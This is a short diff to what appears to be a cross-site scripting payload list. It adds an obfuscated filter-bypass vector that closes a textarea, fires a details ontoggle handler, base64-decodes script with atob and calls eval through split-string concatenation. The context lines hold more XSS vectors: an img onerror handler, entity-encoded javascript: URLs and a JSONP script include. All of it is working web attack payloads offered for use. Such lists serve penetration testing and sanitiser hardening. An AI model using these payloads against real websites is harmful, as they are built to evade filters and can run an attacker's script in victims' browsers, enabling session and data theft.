@@ -20,3 +20,4 @@ OnXSS=<Img/Src/OnError=alert(1)>
 #"></div><a href= javascript&colon;alert&lpar;document&period;domain)
 <script src=https://api.github.com/gist/anything?callback=alert></script>
  '<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
+</textarea>a00n<details open="\u0022x="ontoggle="x=atob;z=x('YWxlcnQoJ0EwME4nKQ==');a00n=top;n=`ev`;a00n[n+'al'](z)">
